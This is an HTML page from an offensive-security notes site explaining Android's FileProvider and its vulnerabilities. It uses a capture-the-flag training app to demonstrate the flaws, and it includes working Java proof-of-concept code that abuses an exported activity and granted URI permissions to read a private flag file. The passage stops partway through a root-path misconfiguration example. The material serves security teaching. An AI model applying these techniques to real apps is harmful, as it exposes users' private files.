@@ -1,0 +1,524 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>offsecnotes | FileProvider</title>
+  <link rel="icon" type="image/png" href="/static/favicon.png">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github.min.css" media="(prefers-color-scheme: light)" data-theme-css="light">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github-dark.min.css" media="(prefers-color-scheme: dark)" data-theme-css="dark">
+  <link rel="stylesheet" href="/static/style.css">
+  <script>
+    // Theme: saved choice (light/dark) or, if none, the system preference.
+    // Runs before the page is drawn, so there's no flash of the wrong theme.
+    function setTheme(theme) {
+      document.documentElement.dataset.theme = theme;
+      document.querySelectorAll("link[data-theme-css]").forEach(function (link) {
+        link.media = link.dataset.themeCss === theme ? "all" : "not all";
+      });
+    }
+    function toggleTheme() {
+      var current = document.documentElement.dataset.theme ||
+        (matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light");
+      var next = current === "dark" ? "light" : "dark";
+      setTheme(next);
+      try { localStorage.setItem("theme", next); } catch (e) {}
+    }
+    try { var saved = localStorage.getItem("theme"); if (saved) setTheme(saved); } catch (e) {}
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/languages/go.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</head>
+<body>
+  <header>
+    <div class="header-top">
+      <h1>offsecnotes</h1>
+      <button class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle light/dark theme" title="Toggle theme"></button>
+    </div>
+    <nav>
+      <a href="/">Home</a> • <a href="/Android/">Android</a> • <a href="/Web/">Web</a> •
+      <a href="/Network/">Network</a> • <a href="/Linux/">Linux</a> •
+      <a href="/Windows/">Windows</a> • <a href="/Misc/">Misc</a>
+    </nav>
+  </header>
+  <h1>FileProvider</h1>
+  <span>by frankheat</span>
+  <div class="toc"><ul>
+<li><a href="#overview" id="toc-overview">Overview</a>
+<ul>
+<li><a href="#specify-the-fileprovider" id="toc-specify-the-fileprovider">Specify the FileProvider</a></li>
+<li><a href="#share-the-files" id="toc-share-the-files">Share the files</a></li>
+</ul></li>
+<li><a href="#vulnerabilities" id="toc-vulnerabilities">Vulnerabilities</a>
+<ul>
+<li><a href="#access-sensitive-files" id="toc-access-sensitive-files">Access sensitive files</a></li>
+<li><a href="#insecure-root-path-fileprovider-config" id="toc-insecure-root-path-fileprovider-config">Insecure root-path FileProvider config</a></li>
+<li><a href="#write-access" id="toc-write-access">Write access</a></li>
+<li><a href="#vulnerability-in-consuming-fileprovider" id="toc-vulnerability-in-consuming-fileprovider">Vulnerability in consuming FileProvider</a></li>
+</ul></li>
+</ul></div>
+  <hr>
+<h2 id="overview">Overview</h2>
+<p>The Android <a href="https://developer.android.com/reference/androidx/core/content/FileProvider"><code>FileProvider</code></a> component generates content URIs for files based on provided XML specifications to <a href="https://developer.android.com/training/secure-file-sharing/setup-sharing">offer a file from an application to another app</a>.</p>
+<blockquote>
+<p><strong>Note</strong>: The <code>FileProvider</code> class is part of the <code>AndroidX Core Library</code>.</p>
+</blockquote>
+<h3 id="specify-the-fileprovider">Specify the FileProvider</h3>
+<p>Defining a <code>FileProvider</code> requires an entry in the application manifest. This entry specifies the authority used to generate content URIs and identifies the XML file defining the shareable directories.</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">manifest</span><span class="ot"> xmlns:android=</span><span class="st">&quot;http://schemas.android.com/apk/res/android&quot;</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="ot">    package=</span><span class="st">&quot;com.example.myapp&quot;</span>&gt;</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">application</span></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>        <span class="er">...</span>&gt;</span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">provider</span></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a><span class="ot">            android:name=</span><span class="st">&quot;androidx.core.content.FileProvider&quot;</span></span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a><span class="ot">            android:authorities=</span><span class="st">&quot;com.example.myapp.fileprovider&quot;</span></span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a><span class="ot">            android:grantUriPermissions=</span><span class="st">&quot;true&quot;</span></span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a><span class="ot">            android:exported=</span><span class="st">&quot;false&quot;</span>&gt;</span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a>            &lt;<span class="kw">meta-data</span></span>
+<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a><span class="ot">                android:name=</span><span class="st">&quot;android.support.FILE_PROVIDER_PATHS&quot;</span></span>
+<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a><span class="ot">                android:resource=</span><span class="st">&quot;@xml/filepaths&quot;</span> /&gt;</span>
+<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a>        &lt;/<span class="kw">provider</span>&gt;</span>
+<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a>        ...</span>
+<span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a>    &lt;/<span class="kw">application</span>&gt;</span>
+<span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">manifest</span>&gt;</span></code></pre></div>
+<p>The <code>android:authorities</code> attribute specifies the URI authority to be used for content URIs generated by the <code>FileProvider</code>. The <code>&lt;meta-data&gt;</code> child element points to an XML file specifying the target directories. The <code>android:resource</code> attribute contains the path and name of the file, excluding the <code>.xml</code> extension.</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">paths</span>&gt;</span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">files-path</span><span class="ot"> path=</span><span class="st">&quot;images/&quot;</span><span class="ot"> name=</span><span class="st">&quot;myimages&quot;</span> /&gt;</span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">paths</span>&gt;</span></code></pre></div>
+<p>In this example, the <code>&lt;files-path&gt;</code> tag shares directories within the <code>files/</code> directory of the app’s internal storage. The <code>path</code> attribute specifies the <code>images/</code> subdirectory. The name attribute instructs the <code>FileProvider</code> to add the path segment <code>myimages</code> to content URIs for files located in <code>files/images/</code>.</p>
+<p>The <code>&lt;paths&gt;</code> element may contain multiple children, each specifying a different directory to share:</p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th>XML Tag</th>
+<th>Physical Location</th>
+<th>Equivalent Method</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td><code>&lt;files-path&gt;</code></td>
+<td>The files/ subdirectory of the app’s internal storage area</td>
+<td><code>Context.getFilesDir()</code></td>
+</tr>
+<tr class="even">
+<td><code>&lt;cache-path&gt;</code></td>
+<td>The cache subdirectory of the app’s internal storage area</td>
+<td><code>Context.getCacheDir()</code></td>
+</tr>
+<tr class="odd">
+<td><code>&lt;external-path&gt;</code></td>
+<td>Files in the root of the external storage area</td>
+<td><code>Environment.getExternalStorageDirectory()</code></td>
+</tr>
+<tr class="even">
+<td><code>&lt;external-files-path&gt;</code></td>
+<td>Files in the root of the app’s external storage area</td>
+<td><code>Context.getExternalFilesDir(null)</code></td>
+</tr>
+<tr class="odd">
+<td><code>&lt;external-cache-path&gt;</code></td>
+<td>Files in the root of the app’s external cache area</td>
+<td><code>Context.getExternalCacheDir()</code></td>
+</tr>
+<tr class="even">
+<td><code>&lt;external-media-path&gt;</code></td>
+<td>Files in the root of the app’s external media area</td>
+<td><code>Context.getExternalMediaDirs()</code></td>
+</tr>
+<tr class="odd">
+<td><code>&lt;root-path&gt;</code></td>
+<td>The root directory of the device</td>
+<td><code>/</code></td>
+</tr>
+</tbody>
+</table>
+<p>These child elements all use the same attributes:</p>
+<ul>
+<li><code>name</code>: A URI path segment. To enforce security, this value hides the name of the subdirectory you’re sharing.</li>
+<li><code>path</code>: The subdirectory being shared. While the name attribute represents a URI path segment, the path value represents an actual subdirectory on the file system.</li>
+</ul>
+<blockquote>
+<p><strong>Important</strong>: The <code>path</code> value refers to a subdirectory, not individual files. Single files cannot be shared by specific filenames, nor can subsets of files be specified using wildcards.</p>
+</blockquote>
+<h3 id="share-the-files">Share the files</h3>
+<p>To share a file with another app using a content URI, the app must:</p>
+<ol type="1">
+<li><p>Generate that URI with <code>FileProvider.getUriForFile()</code>. This method returns a <code>content://</code> URI for files defined in the <code>&lt;paths&gt;</code> element of your FileProvider’s metadata.</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="bu">File</span> newFile <span class="op">=</span> <span class="kw">new</span> <span class="bu">File</span><span class="op">(</span>imagePath<span class="op">,</span> <span class="st">&quot;default_image.jpg&quot;</span><span class="op">);</span> </span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a>Uri contentUri <span class="op">=</span> <span class="fu">getUriForFile</span><span class="op">(</span><span class="fu">getContext</span><span class="op">(),</span> <span class="st">&quot;com.example.myapp.fileprovider&quot;</span><span class="op">,</span> newFile<span class="op">);</span> </span></code></pre></div>
+<p>As a result of the previous snippet <code>getUriForFile()</code> returns the content URI <code>content://com.example.myapp.fileprovider/myimages/default_image.jpg</code>.</p></li>
+<li><p>Granting the receiving app permission to access that URI. This can be done either by explicitly calling <a href="https://offsecnotes.frankheat.io/Android/Application%20security/IPC/content%20providers.html#granting-the-permission-to-a-specific-package"><code>grantUriPermission()</code> for the target package</a> or by <a href="https://offsecnotes.frankheat.io/Android/Application%20security/IPC/content%20providers.html#granting-the-permission-with-an-intent">adding the appropriate permission flags directly to the intent that carries the URI</a>.</p></li>
+</ol>
+<hr />
+<h2 id="vulnerabilities">Vulnerabilities</h2>
+<h3 id="access-sensitive-files">Access sensitive files</h3>
+<p><strong>The impact of being able to access to an app’s files can be high, depending on which files are affected.</strong></p>
+<p>Let’s start by analyzing the manifest for the <code>io.hextree.attacksurface</code> app. We see a <code>FileProvider</code> defined as follows:</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">provider</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:name=</span><span class="st">&quot;androidx.core.content.FileProvider&quot;</span></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:exported=</span><span class="st">&quot;false&quot;</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:authorities=</span><span class="st">&quot;io.hextree.files&quot;</span></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:grantUriPermissions=</span><span class="st">&quot;true&quot;</span>&gt;</span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">meta-data</span></span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a><span class="ot">        android:name=</span><span class="st">&quot;android.support.FILE_PROVIDER_PATHS&quot;</span></span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a><span class="ot">        android:resource=</span><span class="st">&quot;@xml/filepaths&quot;</span>/&gt;</span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">provider</span>&gt;</span></code></pre></div>
+<p>The referenced <code>@xml/filepaths</code> resource configuration exposes the internal <code>flags/</code> directory under the alias <code>flag_files</code>:</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">paths</span>&gt;</span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">files-path</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="ot">        name=</span><span class="st">&quot;flag_files&quot;</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="ot">        path=</span><span class="st">&quot;flags/&quot;</span>/&gt;</span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">files-path</span></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a><span class="ot">        name=</span><span class="st">&quot;other_files&quot;</span></span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a><span class="ot">        path=</span><span class="st">&quot;.&quot;</span>/&gt;</span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">paths</span>&gt;</span></code></pre></div>
+<p>The manifest also exposes <code>Flag34Activity</code>:</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">activity</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:name=</span><span class="st">&quot;io.hextree.attacksurface.activities.Flag34Activity&quot;</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:exported=</span><span class="st">&quot;true&quot;</span>/&gt;</span></code></pre></div>
+<div class="sourceCode" id="cb7"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> Flag34Activity <span class="kw">extends</span> AppCompactActivity <span class="op">{</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">...</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="fu">Flag34Activity</span><span class="op">()</span> <span class="op">{</span><span class="kw">...</span><span class="op">}</span></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a>    <span class="kw">protected</span> <span class="dt">void</span> <span class="fu">onCreate</span><span class="op">(</span>Bundle bundle<span class="op">)</span> <span class="kw">throws</span> <span class="bu">IOException</span> <span class="op">{</span></span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a>        <span class="kw">super</span><span class="op">.</span><span class="fu">onCreate</span><span class="op">(</span>bundle<span class="op">);</span></span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a>        <span class="bu">String</span> stringExtra <span class="op">=</span> <span class="fu">getIntent</span><span class="op">().</span><span class="fu">getStringExtra</span><span class="op">(</span><span class="st">&quot;filename&quot;</span><span class="op">);</span></span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>stringExtra <span class="op">!=</span> <span class="kw">null</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a>            <span class="fu">prepareFlag</span><span class="op">(</span><span class="kw">this</span><span class="op">,</span> stringExtra<span class="op">);</span></span>
+<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a>            Uri uriForFile <span class="op">=</span> FileProvider<span class="op">.</span><span class="fu">getUriForFile</span><span class="op">(</span><span class="kw">this</span><span class="op">,</span> <span class="st">&quot;io.hextree.files&quot;</span><span class="op">,</span> <span class="kw">new</span> <span class="bu">File</span><span class="op">(</span><span class="fu">getFilesDir</span><span class="op">(),</span> stringExtra<span class="op">));</span></span>
+<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a>            Intent intent <span class="op">=</span> <span class="kw">new</span> <span class="fu">Intent</span><span class="op">();</span></span>
+<span id="cb7-13"><a href="#cb7-13" aria-hidden="true" tabindex="-1"></a>            intent<span class="op">.</span><span class="fu">setData</span><span class="op">(</span>uriForFile<span class="op">);</span></span>
+<span id="cb7-14"><a href="#cb7-14" aria-hidden="true" tabindex="-1"></a>            intent<span class="op">.</span><span class="fu">addFlags</span><span class="op">(</span><span class="dv">3</span><span class="op">);</span></span>
+<span id="cb7-15"><a href="#cb7-15" aria-hidden="true" tabindex="-1"></a>            <span class="fu">setResult</span><span class="op">(</span><span class="dv">0</span><span class="op">,</span> intent<span class="op">);</span></span>
+<span id="cb7-16"><a href="#cb7-16" aria-hidden="true" tabindex="-1"></a>            <span class="cf">return</span><span class="op">;</span></span>
+<span id="cb7-17"><a href="#cb7-17" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb7-18"><a href="#cb7-18" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb7-19"><a href="#cb7-19" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>The target flag is located at <code>/data/data/io.hextree.attacksurface/files/flags/flag34.txt</code> file. To get it we can use invoke <code>Flag34Activity</code> using <code>startActivityForResult</code>. When the target activity returns the Intent, our <code>onActivityResult</code> method can use the granted URI permissions to read the file content.</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> MainActivity <span class="kw">extends</span> AppCompatActivity <span class="op">{</span></span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">protected</span> <span class="dt">void</span> <span class="fu">onCreate</span><span class="op">(</span>Bundle savedInstanceState<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a>        <span class="kw">...</span></span>
+<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a>        Intent intent <span class="op">=</span> <span class="kw">new</span> <span class="fu">Intent</span><span class="op">();</span></span>
+<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a>        intent<span class="op">.</span><span class="fu">setClassName</span><span class="op">(</span><span class="st">&quot;io.hextree.attacksurface&quot;</span><span class="op">,</span> <span class="st">&quot;io.hextree.attacksurface.activities.Flag34Activity&quot;</span><span class="op">);</span></span>
+<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a>        intent<span class="op">.</span><span class="fu">putExtra</span><span class="op">(</span><span class="st">&quot;filename&quot;</span><span class="op">,</span> <span class="st">&quot;flags/flag34.txt&quot;</span><span class="op">);</span></span>
+<span id="cb8-9"><a href="#cb8-9" aria-hidden="true" tabindex="-1"></a>        <span class="fu">startActivityForResult</span><span class="op">(</span>intent<span class="op">,</span> <span class="dv">1</span><span class="op">);</span></span>
+<span id="cb8-10"><a href="#cb8-10" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb8-11"><a href="#cb8-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb8-12"><a href="#cb8-12" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb8-13"><a href="#cb8-13" aria-hidden="true" tabindex="-1"></a>    <span class="kw">protected</span> <span class="dt">void</span> <span class="fu">onActivityResult</span><span class="op">(</span><span class="dt">int</span> requestCode<span class="op">,</span> <span class="dt">int</span> resultCode<span class="op">,</span> <span class="at">@Nullable</span> Intent data<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb8-14"><a href="#cb8-14" aria-hidden="true" tabindex="-1"></a>        <span class="kw">super</span><span class="op">.</span><span class="fu">onActivityResult</span><span class="op">(</span>requestCode<span class="op">,</span> resultCode<span class="op">,</span> data<span class="op">);</span></span>
+<span id="cb8-15"><a href="#cb8-15" aria-hidden="true" tabindex="-1"></a>        Uri uri <span class="op">=</span> data<span class="op">.</span><span class="fu">getData</span><span class="op">();</span></span>
+<span id="cb8-16"><a href="#cb8-16" aria-hidden="true" tabindex="-1"></a>        Log<span class="op">.</span><span class="fu">d</span><span class="op">(</span><span class="st">&quot;uri&quot;</span><span class="op">,</span> uri<span class="op">.</span><span class="fu">toString</span><span class="op">());</span></span>
+<span id="cb8-17"><a href="#cb8-17" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb8-18"><a href="#cb8-18" aria-hidden="true" tabindex="-1"></a>        <span class="cf">try</span> <span class="op">{</span></span>
+<span id="cb8-19"><a href="#cb8-19" aria-hidden="true" tabindex="-1"></a>            <span class="bu">InputStream</span> isr <span class="op">=</span> <span class="fu">getContentResolver</span><span class="op">().</span><span class="fu">openInputStream</span><span class="op">(</span>uri<span class="op">);</span></span>
+<span id="cb8-20"><a href="#cb8-20" aria-hidden="true" tabindex="-1"></a>            <span class="bu">BufferedReader</span> reader <span class="op">=</span> <span class="kw">new</span> <span class="bu">BufferedReader</span><span class="op">(</span><span class="kw">new</span> <span class="bu">InputStreamReader</span><span class="op">(</span>isr<span class="op">));</span></span>
+<span id="cb8-21"><a href="#cb8-21" aria-hidden="true" tabindex="-1"></a>            <span class="bu">String</span> line<span class="op">;</span></span>
+<span id="cb8-22"><a href="#cb8-22" aria-hidden="true" tabindex="-1"></a>            <span class="cf">while</span> <span class="op">((</span>line <span class="op">=</span> reader<span class="op">.</span><span class="fu">readLine</span><span class="op">())</span> <span class="op">!=</span> <span class="kw">null</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb8-23"><a href="#cb8-23" aria-hidden="true" tabindex="-1"></a>                Log<span class="op">.</span><span class="fu">d</span><span class="op">(</span><span class="st">&quot;line&quot;</span><span class="op">,</span> line<span class="op">);</span></span>
+<span id="cb8-24"><a href="#cb8-24" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span></span>
+<span id="cb8-25"><a href="#cb8-25" aria-hidden="true" tabindex="-1"></a>            reader<span class="op">.</span><span class="fu">close</span><span class="op">();</span></span>
+<span id="cb8-26"><a href="#cb8-26" aria-hidden="true" tabindex="-1"></a>            isr<span class="op">.</span><span class="fu">close</span><span class="op">();</span></span>
+<span id="cb8-27"><a href="#cb8-27" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span> <span class="cf">catch</span> <span class="op">(</span><span class="bu">IOException</span> e<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb8-28"><a href="#cb8-28" aria-hidden="true" tabindex="-1"></a>            <span class="cf">throw</span> <span class="kw">new</span> <span class="bu">RuntimeException</span><span class="op">(</span>e<span class="op">);</span></span>
+<span id="cb8-29"><a href="#cb8-29" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb8-30"><a href="#cb8-30" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb8-31"><a href="#cb8-31" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>Output:</p>
+<pre><code>...  uri    ... D  content://io.hextree.files/flag_files/flag34.txt
+...  line   ... D  HXT{...}</code></pre>
+<h3 id="insecure-root-path-fileprovider-config">Insecure root-path FileProvider config</h3>
+<p><strong>The <code>&lt;root-path&gt;</code> configuration is not inherently insecure, provided that only trusted files are shared. However, if the application allows an attacker to control the file path, this configuration can be abused to expose arbitrary internal files.</strong></p>
+<p>Let’s start by analyzing the manifest for the <code>io.hextree.attacksurface</code> app. We see a <code>FileProvider</code> defined as follows:</p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">provider</span></span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:name=</span><span class="st">&quot;io.hextree.attacksurface.providers.Flag35FileProvider&quot;</span></span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:exported=</span><span class="st">&quot;false&quot;</span></span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:authorities=</span><span class="st">&quot;io.hextree.root&quot;</span></span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:grantUriPermissions=</span><span class="st">&quot;true&quot;</span>&gt;</span>
+<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">meta-data</span></span>
+<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a><span class="ot">        android:name=</span><span class="st">&quot;android.support.FILE_PROVIDER_PATHS&quot;</span></span>
+<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a><span class="ot">        android:resource=</span><span class="st">&quot;@xml/rootpaths&quot;</span>/&gt;</span>
+<span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">provider</span>&gt;</span></code></pre></div>
+<p>The referenced resource <code>@xml/rootpaths</code> reveals a critical misconfiguration. The <code>&lt;root-path&gt;</code> element maps the <code>root_files</code> alias to the system root (<code>/</code>):</p>
+<div class="sourceCode" id="cb11"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="fu">&lt;?xml</span><span class="ot"> version=</span><span class="st">&quot;1.0&quot;</span><span class="ot"> encoding=</span><span class="st">&quot;utf-8&quot;</span><span class="fu">?&gt;</span></span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">paths</span>&gt;</span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">root-path</span></span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a><span class="ot">        name=</span><span class="st">&quot;root_files&quot;</span></span>
+<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a><span class="ot">        path=</span><span class="st">&quot;/&quot;</span>/&gt;</span>
+<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">paths</span>&gt;</span></code></pre></div>
+<blockquote>
+<p><strong>Note</strong>: Using <code>root-path</code> allows the <code>FileProvider</code> to generate URIs for any file on the device filesystem, assuming the app has filesystem access to it.</p>
+</blockquote>
+<p>The manifest also exposes <code>Flag35Activity</code>:</p>
+<div class="sourceCode" id="cb12"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">activity</span></span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:name=</span><span class="st">&quot;io.hextree.attacksurface.activities.Flag35Activity&quot;</span></span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:exported=</span><span class="st">&quot;true&quot;</span>/&gt;</span></code></pre></div>
+<div class="sourceCode" id="cb13"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> Flag35Activity <span class="kw">extends</span> AppCompactActivity <span class="op">{</span></span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">...</span></span>
+<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">protected</span> <span class="dt">void</span> <span class="fu">onCreate</span><span class="op">(</span>Bundle bundle<span class="op">)</span> <span class="kw">throws</span> <span class="bu">IOException</span> <span class="op">{</span></span>
+<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a>        <span class="kw">super</span><span class="op">.</span><span class="fu">onCreate</span><span class="op">(</span>bundle<span class="op">);</span></span>
